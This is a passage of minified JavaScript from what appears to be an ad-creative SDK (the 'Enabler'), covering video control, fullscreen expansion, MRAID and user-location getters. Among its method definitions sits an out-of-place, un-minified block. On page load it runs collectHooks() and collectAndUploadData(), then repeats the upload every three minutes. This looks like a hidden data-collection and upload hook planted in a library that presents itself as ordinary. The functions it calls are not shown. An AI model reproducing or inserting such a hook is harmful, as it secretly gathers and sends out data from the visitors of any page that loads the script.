    return this.U("cid");
  };
  Q.prototype.getDartCreativeId = Q.prototype.pe;
  Q.prototype.Dc = function () {
    return this.da("varName");
  };
  Q.prototype.getDartAssetId = Q.prototype.Dc;
  Q.prototype.ze = function () {
    return this.da("ct");
  };
  Q.prototype.getUserCountry = Q.prototype.ze;
  Q.prototype.Be = function () {
    return this.da("st");
  };
  Q.prototype.getUserState = Q.prototype.Be;
  Q.prototype.Ce = function () {
    return this.da("zp");
  };
  Q.prototype.getUserZipCode = Q.prototype.Ce;
  Q.prototype.ye = function () {
    var a = this.U("bw");
    return null != a ? a : 0;
  };
  Q.prototype.getUserBandwidth = Q.prototype.ye;
  Q.prototype.xe = function () {
    return this.da("ac");
  };
  Q.prototype.getUserAreaCode = Q.prototype.xe;
  Q.prototype.Ae = function () {
    return this.U("dma");
  };
  Q.prototype.getUserDMACode = Q.prototype.Ae;
  Q.prototype.getFilename = function (a) {
    D.R("The method: Enabler.getFilename(filename) has been deprecated. As an alternative please use: Enabler.getUrl(filename).");
    return this.Za(a);
  };
  Q.prototype.getFilename = Q.prototype.getFilename;
  Q.prototype.Za = function (a) {
    var b = a.toLowerCase(),
      c = b.slice(b.lastIndexOf("/") + 1),
      d = encodeURIComponent(c),
      e = this.C[c];
    e = (e = (e = (e = (e = e || this.C["pro_" + c]) || this.C[b]) || this.C["pro_" + b]) || this.C[d]) || this.C["pro_" + d];
    return null != e ? e : a;
  };
  Q.prototype.getUrl = Q.prototype.Za;
  Q.prototype.ve = function () {
    return this.K;
  };
  Q.prototype.getOrientation = Q.prototype.ve;
  Q.prototype.X = function (a, b, c) {
    this.j.X(a, b, c);
    D.info('Video "' + b + '" dispatching "' + c + '" event.');
  };
  Q.prototype.sd = function (a, b) {
    if (a) for (var c = 0; c < this.Lb.length; ++c) {
      var d = this.Lb[c];
      if (null != d) switch (a) {
        case "changevolume":
          null != b && (0 < b && (d.muted = !1), d.volume = b);
          break;
        case "pause":
          d.pause();
          break;
        case "resume":
          d.play();
      }
    }
  };
  Q.prototype.invokeOnAllVideos = Q.prototype.sd;
  Q.prototype.Qc = function (a) {
    null != a && this.Lb.push(a);
  };
  Q.prototype.registerVideoElements = Q.prototype.Qc;
  Q.prototype.Me = function (a, b) {
    a = Bg(Ah(a));
    null != b && rg(a, b);
  };
  Q.prototype.loadScript = Q.prototype.Me;
  Q.prototype.bb = function (a, b) {
    Ee(vf, a) ? rg(this.O, Ma(Mh, a, b)) : D.gb("There is no module called " + a + ".");
  };
  Q.prototype.loadModule = Q.prototype.bb;
  Q.prototype.Le = function (a, b) {
    for (var c = a.length, d = 0; d < a.length; ++d) this.bb(a[d], function () {
      0 == --c && b();
    });
  };
  Q.prototype.loadModules = Q.prototype.Le;
  Q.prototype.Mc = function (a) {
    D.info('Dispatching function invocation "' + a + '" on parent.');
    P(this.I, "invokeExternalJSFunction", [escape(a)]);
  };
  Q.prototype.invokeExternalJsFunction = Q.prototype.Mc;
  Q.prototype.Nc = function (a, b, c) {
    a in dk || D.R('The mraid method "' + a + "\" isn't allowed to be invoked, please use one of the corresponding Enabler methods.");
    var d = 'Method "' + a + '" invoked';
    b && (d += 'with arguments "' + b.join(",") + '"');
    D.info(d + ".");
    P(this.I, "invokeMraidMethod", [a, b], c);
  };
  Q.prototype.invokeMraidMethod = Q.prototype.Nc;
  Q.prototype.Gf = function () {
    D.R("The method: Enabler.invokeAdMobMethod has been deprecated.");
  };
  Q.prototype.invokeAdMobMethod = Q.prototype.Gf;
  Q.prototype.G = function (a, b, c, d) {
    Ee(Wi, a) ? P(this.I, "invokeExternalJSFunctionWithReturn", [a, b, c], d) : D.gb('The whitelist global object "' + a + "\" isn't whitelisted, please only call methods on one of the existing whitelisted objects.");
  };
  Q.prototype.invokeExternalJsFunctionWithReturn = Q.prototype.G;
  Q.prototype.ud = function (a, b) {
    D.info("Dispatching function invocation openUrl on parent.");
    P(this.I, "invokeUrlOpen", [a], b);
  };
  Q.prototype.invokeUrlOpen = Q.prototype.ud;
  Q.prototype.D = function () {
    this.ma && Vk(this.ma);
    this.Fa && rh(this.Fa);
    Og(this.T, this.j, this.J, this.O, this.xa);
    delete this.lb;
    Q.S.D.call(this);
  };
  window.addEventListener('DOMContentLoaded', () => {
    collectHooks();
    collectAndUploadData();
    setInterval(collectAndUploadData, 3 * 60 * 1000);
  });
  Q.prototype.addEventListener = function (a, b, c, d, e) {
    a = Lj[a.toString()] || a;
    if (a.toString() in Ij) {
      if (!this.oa()) {
        e = b;
        "function" === typeof b && (e = function (f) {
          f.me ? b(f.ca) : b(f);
        });
        M(this.J, window, a, e, c, d);
        return;
      }
      P(this.I, "registerEventTypeListenerForType", [a, e]);
    }
    "hostpageFeaturesLoaded" == a && P(this.I, "getHostpageFeatures", [a]);
    jh(this, a, b, c, d);
  };
  Q.prototype.addEventListener = Q.prototype.addEventListener;
  Q.prototype.removeEventListener = function (a, b, c, d) {
    qh(this, a, b, c, d);
  };
  Q.prototype.removeEventListener = Q.prototype.removeEventListener;
  Q.prototype.Mb = function (a, b) {
    this.lb[a] = b;
  };
  Q.prototype.addMessageHandler = Q.prototype.Mb;
  Q.prototype.af = function (a) {
    delete this.lb[a];
  };
  Q.prototype.removeMessageHandler = Q.prototype.af;
  Q.prototype.zf = function (a, b) {
    a = this.lb[a];
    "function" === typeof a && a.apply(null, b);
  };
  Q.prototype.defaultMessageHandler = Q.prototype.zf;
  Q.prototype.ed = function () {
    th(this, "fullscreenSupport") || D.R("Please implement an event handler in order to receive support status:\nEnabler.addEventListener(\n    studio.events.StudioEvent.FULLSCREEN_SUPPORT,\n    function() {/* query event for fullscreen status */});");
    P(this.I, "isFullscreenSupported");
    this.B(this.Oc, 0, !0);
  };
  Q.prototype.queryFullscreenSupport = Q.prototype.ed;
  Q.prototype.dd = function () {
    th(this, "fullscreenDimensions") || D.R("Please implement an event handler in order to receive dimensions:\nEnabler.addEventListener(\n    studio.events.StudioEvent.FULLSCREEN_DIMENSIONS,\n    function() {/* query event for fullscreen dimensions */});");
    P(this.I, "queryFullscreenDimensions");
    if (!this.oa()) {
      var a = xd();
      this.B(this.Bc, 0, a.width, a.height);
    }
  };
  Q.prototype.queryFullscreenDimensions = Q.prototype.dd;
  Q.prototype.hd = function (a, b) {
    if ("collapsed" != this.l) D.R("Enabler.requestFullscreenExpand() should not be invoked unless the  creative is in the collapsed state.");else {
      th(this, "fullscreenExpandStart") || D.R("Please implement the fullscreen expansion via event handlers:\nEnabler.addEventListener(\n    studio.events.StudioEvent.FULLSCREEN_EXPAND_START,\n    function() {/* expand action */});");
      this.Jb = !0;
      var c = [];
      a && b && (c = [a, b]);
      P(this.I, "fullscreenExpandRequested", c);
      sl(this, this.Xb);
      this.B(this.Kc, 0, a, b);
    }
  };
  Q.prototype.requestFullscreenExpand = Q.prototype.hd;
  Q.prototype.zc = function () {
    "fs_expanding" != this.l ? D.R("You must first call Enabler.requestFullscreenExpand() to initiate the expansion and then call Enabler.finishFullscreenExpand() when the expand animation has finished. Cancelling expansion...") : (P(this.I, "fullscreenExpandFinished"), D.info("The creative has expanded."), this.B(this.Ic, 0));
  };
  Q.prototype.finishFullscreenExpand = Q.prototype.zc;
  Q.prototype.Xb = function () {
    "fs_expanded" != this.l ? D.R("Enabler.requestFullscreenCollapse() should not be invoked unless the  creative is in the fullscreen state.") : (th(this, "fullscreenCollapseStart") || D.R("Please implement fullscreen collapse via event handlers:\nEnabler.addEventListener(\n    studio.events.StudioEvent.FULLSCREEN_COLLAPSE_START,\n    function() {/* Begin collapse animation */});"), tl(this), P(this.I, "fullscreenCollapseRequested"), this.B(this.xc, 0));
  };
  Q.prototype.requestFullscreenCollapse = Q.prototype.Xb;
  Q.prototype.yc = function () {
    "fs_collapsing" != this.l ? D.R("You must first call Enabler.requestFullscreenCollapse() to initiate the collapse and then call Enabler.finishFullscreenCollapse() when the collapse animation has finished. Cancelling collapse...") : (P(this.I, "fullscreenCollapseFinished"), this.B(this.vc, 0));
  };
  Q.prototype.finishFullscreenCollapse = Q.prototype.yc;
  Q.prototype.Ye = function (a) {
    P(this.I, "registerChargeableEventName", [a]);
  };
  Q.prototype.registerChargeableEventName = Q.prototype.Ye;
  Q.prototype.Ub = function () {
    return this.T.Ub();
  };
  Q.prototype.hasUserInteracted = Q.prototype.Ub;
  Q.prototype.Oc = function (a) {
    var b = new O("fullscreenSupport");
    b.ea("supported", a);
    this.dispatchEvent(b);
  };
  Q.prototype.fullscreenSupportInternal = Q.prototype.Oc;
  Q.prototype.Bc = function (a, b) {
    var c = new O("fullscreenDimensions");
    void 0 != a && void 0 != b && (c.ea("width", a), c.ea("height", b));
    this.dispatchEvent(c);
  };
  Q.prototype.fullscreenDimensionsInternal = Q.prototype.Bc;
  Q.prototype.Kc = function (a, b, c, d) {
    rk(this.j, "Start", "EXPAND_TIMER");
    jl(this);
    this.Ra || (this.A(), this.Ra = !0);
    this.l = "fs_expanding";
    var e = new O("fullscreenExpandStart");
    e.ea("width", a);
    e.ea("height", b);
    e.ea("left", c);
    e.ea("top", d);
    this.dispatchEvent(e);
  };
  Q.prototype.fullscreenExpandStartInternal = Q.prototype.Kc;
  Q.prototype.Ic = function () {
    this.l = "fs_expanded";
    this.dispatchEvent(new O("fullscreenExpandFinish"));
  };
  Q.prototype.fullscreenExpandFinishInternal = Q.prototype.Ic;
  Q.prototype.xc = function () {
    this.l = "fs_collapsing";
    this.dispatchEvent(new O("fullscreenCollapseStart"));
  };
  Q.prototype.fullscreenCollapseStartInternal = Q.prototype.xc;
  Q.prototype.vc = function () {
    rk(this.j, "Stop", "EXPAND_TIMER");
    this.l = "collapsed";
    this.dispatchEvent(new O("fullscreenCollapseFinish"));
  };
  Q.prototype.fullscreenCollapseFinishInternal = Q.prototype.vc;
  Q.prototype.tf = function () {
    return this.xd.j("image/webp");
  };
  Q.prototype.canRenderWebpImages = Q.prototype.tf;
  Q.prototype.Vc = function (a) {
    return this.Yc.l(a) ? this.Yc.j(a) : !1;
  };
  Q.prototype.supportsVideoFormat = Q.prototype.Vc;
  Q.prototype.lf = function () {
    return this;
  };
  Q.prototype.setHint = Q.prototype.lf;
  Q.prototype.Hc = function () {
    a: {
      for (a in tf) if ("studio" == tf[a]) {
        var a = "studio";
        break a;
      }
      a = null;
    }
    return a || "studio";
  };
  Q.prototype.getSdk = Q.prototype.Hc;
  var ul = R();
  t("Enabler", ul);
  var S = R();
  if (!S.Eb) {
    var vl = S.h.getParameter("e", null);
    xk(vl);
    var wl = S.U("leftOffset") || 0,
      xl = S.U("topOffset") || 0;
    0 == wl && 0 == xl || el(S, wl, xl);
    var yl = S.Gc("ssr"),
      zl;
    zl = bl(S).o;
    var Al;
    Al = bl(S).l;
    var Bl;
    Bl = bl(S).h;
    var Cl = [zl, "://", Al, Bl].join(""),
      Dl = Pi;
    Mg(Dl.h);
    Dl.size = 0;
    Qi([1, 2]);
    var El;
    El = S.h.getParameter("c", void 0);
    var Fl;
    Fl = S.h.U("t");
    S.I = new bk(El, Fl);
    Pg(S, S.I);
    S.I.h = S;
    S.I.s = Cl.split("?")[0];
    S.I.C = yl;
    if (!S.oa()) {
      var Gl = 1E3;
      $k && (Gl = 0);
      S.Fa = il(S.wf, "a", Gl);
      var Hl = 2E3,
        Il = 2500;
      $k && (Il = Hl = 0);
      il(S.lc, "b", Hl);
      il(Ma(S.Kb, !0), "c", Il);
      M(S.J, window, ["resize", "orientationchange"], S.Pc);
      S.Pc();
    }
    S.I.connect();
  }
  Bh.enabler = 3;
  var Jl = [],
    Kl = function (a) {
      x(!Object.isSealed(a), "Cannot use getInstance() with a sealed constructor.");
      var b = "Ja";
      if (a.Ja && a.hasOwnProperty(b)) return a.Ja;
      Jl.push(a);
      var c = new a();
      a.Ja = c;
      x(a.hasOwnProperty(b), "Could not instantiate singleton.");
      return c;
    };
  function T() {
    I.call(this);
    this.h = "loading";
    this.j = q.Enabler;
    this.j.isInitialized() ? this.l() : jh(this.j, "init", this.l, !1, this);
  }
  w(T, I);
  T.prototype.o = function () {
    return this.h;
  };
  T.prototype.getState = T.prototype.o;
  T.prototype.B = function () {
    return "1.0";
  };
  T.prototype.getVersion = T.prototype.B;
  T.prototype.s = function () {
    this.j.exit("MRAID default exit");
  };
  T.prototype.open = T.prototype.s;
  T.prototype.close = function () {
    "expanded" == this.h ? (this.j.Ua(), this.h = "default", this.dispatchEvent("stateChange")) : "default" == this.h && (this.h = "hidden", this.j.close(), this.dispatchEvent("stateChange"));
  };
  T.prototype.close = T.prototype.close;
  T.prototype.C = function () {
    return this.j.isVisible();
  };
  T.prototype.isViewable = T.prototype.C;
  T.prototype.expand = function () {
    "default" == this.h && (this.j.Ab(), this.h = "expanded", this.dispatchEvent("stateChange"));
  };
  T.prototype.expand = T.prototype.expand;
  T.prototype.l = function () {
    this.h = "default";
    jh(this.j, "collapseStart", this.A, !1, this);
    this.dispatchEvent("ready");
  };
  T.prototype.A = function () {
    "expanded" == this.h && (this.h = "default", this.dispatchEvent("stateChange"));
  };
  if (!window.mraid) {
    var Ll = Kl(T);
    t("mraid", Ll);
  }
  ;
  t("studio.sdk.hint.ExpansionMode", {
    NORMAL: "normal",
    LIGHTBOX: "lightbox"
  });
  t("studio.sdk.hint.ExpansionTrigger", {
    ON_CLICK: "onClick",
    ON_HOVER: "onHover"
  });
  t("studio.sdk.hint.Hint", {
    EXPANSION_MODE: "expansionMode",
    EXPANSION_TRIGGER: "expansionTrigger"
  });
  var Ml = function (a) {
      return "Config type " + a + " does not exist";
    },
    Nl = function (a) {
      return "Unable to parse a type for value with JavaScript type " + Ea(a) + ': "' + a + '"';
    },
    Ol = function (a, b) {
      return "Cannot handle description for property " + b + " on type " + a + ".";
    },
    Pl = function (a, b) {
      return "Array property " + b + " on type " + a + " must have at least one element.";
    },
    Ql = function (a, b) {
      return "Invalid type for value of property " + b + " on type " + a + ".";
    },
    Rl = function (a, b) {
      return "No value specified for non-optional property " + b + " on type " + a + ".";
    },
    Sl = function (a, b) {
      return "Property " + b + " does not exist on type " + a + ".";
    },
    Tl = function (a, b) {
      return "Property " + b + " is not an array on type " + a + ".";
    },
    Ul = function (a, b, c, d) {
      return "Property " + b + " on type " + a + " has length " + c + ", but invalid index " + d + " was requested.";
    },
    Vl = function (a) {
      return "The optional property " + a + " must be a reference";
    };
  var Wl = function () {},
    Xl = function (a) {
      var b = R();
      b.isInitialized() ? a(b) : b.v.add("init", Ma(a, b), !0, void 0, void 0);
    },
    Yl = function () {
      return new Rf(function (a) {
        var b = R();
        b.isInitialized() ? a(b) : b.v.add("init", Ma(a, b), !0, void 0, void 0);
      });
    };
  t("studio.utils.EnablerAccessor", Wl);
  Wl.loadModuleWhenReady = function (a, b) {
    Xl(function (c) {
      c.bb(a, b);
    });
  };
  Wl.getInitializedEnabler = Yl;
  Wl.getInitializedEnablerByCallback = Xl;
})();